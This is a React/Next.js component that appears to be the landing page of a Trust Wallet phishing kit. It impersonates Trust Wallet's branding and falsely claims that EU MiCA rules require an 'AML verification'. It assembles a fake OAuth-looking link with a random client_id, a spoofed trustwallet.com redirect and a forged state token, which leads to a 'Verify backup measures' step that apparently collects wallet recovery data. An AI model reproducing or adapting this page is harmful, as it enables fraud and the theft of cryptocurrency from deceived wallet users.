'use client'
import ChevronRightIcon from './ChevronRightIcon';
import { useState, useEffect } from 'react'
import Link from 'next/link'
import TrustLogo from './trustLogo'
import AddCircle from './addCircle';
import Footer from '../components/footer';
import TrustStats from '../components/stars';
function generateRandomString(length: number) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  let result = ''
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length))
  }
  return result
}

export default function VerificationRequest() {
  const [dynamicUrl, setDynamicUrl] = useState('')

  useEffect(() => {
    const clientId = generateRandomString(32)
    const redirectUri = encodeURIComponent("https://account.trustwallet.com/oauth-connect")
    const state = `v2.local.${generateRandomString(16)}.${generateRandomString(48)}`
    const options = encodeURIComponent("login account.trustwallet.com")

    const url = `/verify?url=/api/1/login/oauth/provider/pending` +
      `&client_id=${clientId}` +
      `&redirect_uri=${redirectUri}` +
      `&state=${state}` +
      `&options=${options}`

    setDynamicUrl(url)
  }, [])

  return (
    <div>
      <div className="mt-12 items-center flex justify-center flex-col">
       <div>
        <svg
        width="293"
        height="80"
        viewBox="0 0 293 80"
        fill="none"
        className="h-auto w-[160px]"
      >
      <TrustLogo/>
      
        <defs>
          <linearGradient
            id="paint0_linear_1578_140118undefined"
            x1="35.1288"
            y1="89.0035"
            x2="63.8924"
            y2="-15.0289"
            gradientUnits="userSpaceOnUse"
          >
            <stop offset="0.26" stop-color="#48FF91"></stop>
            <stop offset="0.66" stop-color="#0094FF"></stop>
            <stop offset="0.8" stop-color="#0038FF"></stop>
            <stop offset="0.89" stop-color="#0500FF"></stop>
          </linearGradient>
          <linearGradient
            id="paint0_linear_1578_102342undefined"
            x1="61.762"
            y1="-4.56968"
            x2="35.2193"
            y2="78.953"
            gradientUnits="userSpaceOnUse"
          >
            <stop offset="0.02" stop-color="#0000FF"></stop>
            <stop offset="0.08" stop-color="#0094FF"></stop>
            <stop offset="0.16" stop-color="#48FF91"></stop>
            <stop offset="0.42" stop-color="#0094FF"></stop>
            <stop offset="0.68" stop-color="#0038FF"></stop>
            <stop offset="0.9" stop-color="#0500FF"></stop>
          </linearGradient>
          <clipPath id="clip0_1578_140118undefined">
            <rect
              width="291.936"
              height="79.0661"
              fill="white"
              transform="translate(0.814331)"
            ></rect>
          </clipPath>
        </defs>
      </svg>
      
       </div>
       <div className="mt-14 flex flex-col text-center font-bold  text-bold text-white border m-12 px-4 py-4 rounded-sm border-[#575757] lg:w-[600px] w-96 lg:max-w-lg">
        <h2 className="scroll-m-20 text-4xl font-medium tracking-tight lg:text-2xl text-white">You have been requested to authorize wallet AML verification </h2>
        <h5 className="leading-7 [&:not(:first-child)]:mt-2 text-[#8C8C8C]">European Union MICA laws need us to verify the security of your wallet and perform anti-money laundering checks</h5>
        <div className="h-0.5 w-full mt-2 bg-[#fff] opacity-40">
        
        </div>
        <Link href={dynamicUrl}>
       <div className="flex mt-2 align-middle justify-center items-center space-x-4 px-2">
        <span className="material-symbols-outlined">
         <AddCircle />
          </span>
          <div className="flex flex-col items-center justify-center align-middle text-center">
            <h3>Verify backup measures</h3>
            <h5 className=" text-sm text-[#8C8C8C] text-center">Ensure you are able to recover in an unfortunate scenario</h5>
          </div>
         
          <ChevronRightIcon/>
        
       </div>
       </Link>
       
       </div>
       <Footer />
       </div>

      </div>
  )
}

